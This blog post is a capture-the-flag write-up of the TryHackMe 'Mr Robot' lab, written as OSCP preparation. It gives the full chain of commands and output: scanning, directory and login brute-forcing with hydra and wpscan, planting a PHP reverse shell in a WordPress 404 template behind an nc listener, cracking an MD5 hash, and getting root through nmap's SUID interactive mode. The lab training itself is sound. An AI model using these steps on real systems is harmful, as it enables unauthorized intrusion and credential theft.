---
layout: post
title:  THM Mr Robot CTF Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-10 07:00:00 +0300
image:  '/images/thm_mr_robot_ctf.png'
tags:   [Write-ups, THM, OSCP+, Linux, Medium, WordPress, Login-Brute-Force, WP-Template-PHP-Reverse-Shell, MD5-Hash, Nmap-SUID]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Visiting the website](#visiting-the-website)
  - [robots.txt](#robotstxt)
  - [fsocity.dic](#fsocitydic)
  - [Feroxbuster Directory Brute-force to find WordPress](#feroxbuster-directory-brute-force-to-find-wordpress)
- [Slow Method to get Credentials of Elliot](#slow-method-to-get-credentials-of-elliot)
  - [Using fsocity.dic to enumerate valid users](#using-fsocitydic-to-enumerate-valid-users)
  - [Use WPScan to brute-force password in fsocity.dic](#use-wpscan-to-brute-force-password-in-fsocitydic)
- [Fast Method to get Credentials of Elliot](#fast-method-to-get-credentials-of-elliot)
  - [Use Feroxbuster with common.txt wordlist to find /license](#use-feroxbuster-with-commontxt-wordlist-to-find-license)
- [Foothold](#privilege-escalation)
  - [Accessing WordPress as Elliot](#accessing-wordpress-as-elliot)
  - [Getting Reverse Shell adding PHP Reverse Shell into 404.php page of a Theme](#getting-reverse-shell-adding-php-reverse-shell-into-404php-page-of-a-theme)
  - [Finding the password of the user robot](#finding-the-password-of-the-user-robot)
  - [Cracking the MD5 hash to get the password of the user robot](#cracking-the-md5-hash-to-get-the-password-of-the-user-robot)
  - [Using su on Linux CLI to change user to robot](#using-su-on-linux-cli-to-change-user-to-robot)
- [Privilege Escalation](#privilege-escalation)
  - [Enumerating Privilege Escalation vectors](#enumerating-privilege-escalation-vectors)
  - [Escalating Priviliges with Nmap SUID](#escalating-priviliges-with-nmap-suid)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.10.22.59

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
nmap -A -T4 -Pn -p22,80,443 10.10.22.59
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-09 23:09 EST
Nmap scan report for 10.10.22.59
Host is up (0.052s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.24 seconds
```

Examining our Nmap results, we found closed SSH at port 22, HTTP at port 80 and HTTPS at port 443. Let's enumerate the ports 80 and 443.
### Visiting the website
```shell
http://10.10.22.59
```

```shell
https://10.10.22.59
```

Visiting the website we found what it seems to be a video and some kind of interactive Linux CLI simulation with some commands. Entering these commands lead us to another videos. But this doesnt seem to be the way.

### robots.txt
One of the first things I do when I find a website is checking robots.txt.

```shell
https://10.10.22.59/robots.txt
```

Inside robots.txt we can find the following content:

```shell
User-agent: *
fsocity.dic
key-1-of-3.txt
```

### Key 1

Now we know how to get key 1. Visit the following URL to get key 1:

```shell
https://10.10.22.59/key-1-of-3.txt
```

### fsocity.dic
If we visit the following URL, we will download a file called fsocity.dic:

```shell
https://10.10.22.59/fsocity.dic
```

If we check the content of the file, we will notice what it seems to be a wordlist.

We can use this to bruteforce usernames and passwords.

### Feroxbuster Directory Brute-force to find WordPress
Let's use Feroxbuster to brute-force and enumerate directories. Maybe we can find a login portal where we can enter a username and password:

```shell
feroxbuster -u http://10.10.22.59/
```

Looking at the results of Feroxbuster, it seems like the website is using WordPress.

We can reach the login portal of WordPress through the following URL:
```shell
http://10.10.22.59/wp-login.php
```

If we enter any username and password, we will get a message indicating invalid username.

We tried to enumerate WordPress users with wpscan but werent successful:

```shell
wpscan --url http://10.10.22.59/
wpscan --url http://10.10.22.59/ -e u
```

# Slow Method to get Credentials of Elliot
### Using fsocity.dic to enumerate valid users
Now that we found a way to access a login portal, we can try to enumerate valid users using fsocity.dic and hydra with the following command:

```shell
hydra -L fsocity.dic -p 123453453 10.10.22.59 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

We got a valid user:

```shell
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-09 23:50:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.22.59:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
[80][http-post-form] host: 10.10.22.59   login: Elliot   password: 123453453
[STATUS] 1983.00 tries/min, 1983 tries in 00:01h, 856252 to do in 07:12h, 16 active
[80][http-post-form] host: 10.10.22.59   login: elliot   password: 123453453
```

### Use WPScan to brute-force password in fsocity.dic
Now we can use wpscan to try to get the password of Elliot:

```shell
wpscan --url 10.10.22.59 --passwords fsocity.dic --usernames Elliot -t 50
```

This will take long but we will get the following valid credentials at some point:

```shell
# Username
Elliot

# Password
ER28-0652
```
# Fast Method to get Credentials of Elliot
### Use Feroxbuster with common.txt wordlist to find /license
There is a faster method to find the credentials. For that, we need to find /license using Feroxbuster without recursive option and with the common.txt wordlist:

```shell
feroxbuster -u http://10.10.22.59/ -w /usr/share/wordlists/dirb/common.txt -n
```

In the results we can find the following URL:

```shell
<SNIP>
200      GET      156l       27w      309c http://10.10.22.59/license
<SNIP>
```

```shell
http://10.10.22.59/license
```

If we visit the URL above and check the file license, we can scroll down to the bottom to find a base64 string:

```shell
ZWxsaW90OkVSMjgtMDY1Mgo=
```

We can decode it on Linux CLI using the following command:

```shell
echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
```

This will give us the credentials of Elliot:

```shell
elliot:ER28-0652
```

# Foothold
### Accessing WordPress as Elliot
With the credentials of Elliot, we can now log into WordPress on the following URL:

```shell
http://10.10.22.59/wp-login.php
```

```shell
# Username
Elliot

# Password
ER28-0652
```

After logging in successfully, we will see a dashboard.

At the bottom we can find the version of WordPress being used:

```shell
Version 4.3.1
```

### Getting Reverse Shell adding PHP Reverse Shell into 404.php page of a Theme
We will get a reverse shell putting a php reverse shell into the page 404.php of a theme, activating that theme and visiting its 404.php page to trigger the reverse shell and get an answer on our nc listener.

First, start an nc listener on Kali and let it to run, we will get a response there later:

```shell
nc -lvnp 8443
```

Then check the available themes. From the dashboard after logging, go to:

```shell
Appearance (Left grey column) -> Themes
```

Here we can see 3 available themes: Twenty Thirteen (Active), Twenty Fourteen and Twenty Fifteen.

We will put our reverse shell in the 404.php page of the currently unactive theme Twenty Fourteen. Go to:

```shell
Appearance (Left grey column)-> Editor -> Select theme to edit: Twenty Fourteen (Top right corner of the website) -> Click Select
```

Now click on 404 Template (404.php) and at the start of the code enter the PHP Ivan Sincek reverse shell with your Kali IP and the port of our nc listener, in this case 8443. 

You can obtain the PHP Ivan Sincek reverse shell from:

https://revshells.com

Once you put the reverse shell at the start of the code, click on Update File (Scroll down if needed).

After that, go to:

```shell
Appearance (Left grey column) -> Themes -> Hoover over Twenty Fourteen -> Click on Activate
```

Now we can trigger the reverse shell by just visiting the following URL:

```shell
https://10.10.22.59/404.php
```

After visiting the URL above, we will get a response on our nc listener:

```shell
listening on [any] 8443 ...
connect to [10.11.113.193] from (UNKNOWN) [10.10.22.59] 60119
SOCKET: Shell has connected! PID: 2989
whoami
daemon
```

Now we just need to upgrade our shell entering the following command:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/opt/bitnami/apps/wordpress/htdocs$
```

### Finding the password of the user robot
The first thing I always do is trying to check the /home folder to see if I can access a flag or files of any user, or just enumerate the available users.

Using the following command we were able to find the user robot:

```shell
ls -al /home
```

```shell
total 12
drwxr-xr-x  3 root root 4096 Nov 13  2015 .
drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
```

Now we can try to check the files inside the folder of the user robot:

```shell
# Check the files inside robot folder
ls -al /home/robot

# It seems we cant get the second key, permission is denied
cat /home/robot/key-2-of-3.txt
cat: /home/robot/key-2-of-3.txt: Permission denied

# But we can get this md5 hash, which seems to be the password of the user robot
cat /home/robot/password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Cracking the MD5 hash to get the password of the user robot
Lets try to crack the MD5 hash using hashcat:

```shell
# Check which -m mode we need to use
hashcat -h | grep MD5

# Looking at the results, I will use -m 0, which is just MD5

# Lets crack the hash (You can put the hash directly, or preferably put the hash in a file called hash.txt)
hashcat -m 0 'c3fcd3d76192e4007dfb496cca67e13b' /usr/share/wordlists/rockyou.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# We successfully cracked the hash and got the password of the user robot

# Take a look at the results
hashcat -m 0 hash.txt --show
```

The password of the user robot is:

```shell
abcdefghijklmnopqrstuvwxyz
```

We could get access using SSH and the credentials we got for the user robot, but our Nmap scan told us that the 22 port is closed.
### Using su on Linux CLI to change user to robot
We will use su on the Linux CLI to change our user to robot using the following command:

```shell
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$
```

It worked! It was truly the password of the user robot.
### Key 2
Now we can get the second key:

```shell
cat /home/robot/key-2-of-3.txt
```

# Privilege Escalation
### Enumerating Privilege Escalation vectors
We can try an easy win with sudo -l first:

```shell
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```

It seems we werent lucky.

Lets try the second best easy win enumerating SUIDs:

```shell
find / -perm -4000 -type f 2>/dev/null
```

Now we had better luck, we found nmap on the results:

```shell
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

### Escalating Priviliges with Nmap SUID
Searching on GTFOBins for a Privilege Escalation method for Nmap we found something:

```shell
https://gtfobins.github.io/gtfobins/nmap/
```

We also found this article:

https://www.adamcouch.co.uk/linux-privilege-escalation-setuid-nmap/

It seems like if we run the following commands we can get root:

```shell
/usr/local/bin/nmap --interactive
nmap> !sh
```

Nice! We got shell as root:

```shell
robot@linux:/opt/bitnami/apps/wordpress/htdocs$ /usr/local/bin/nmap --interactive
<ps/wordpress/htdocs$ /usr/local/bin/nmap --interactive                      

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
```

### Key 3
We can now get the Key 3:

```shell
cat /root/key-3-of-3.txt
```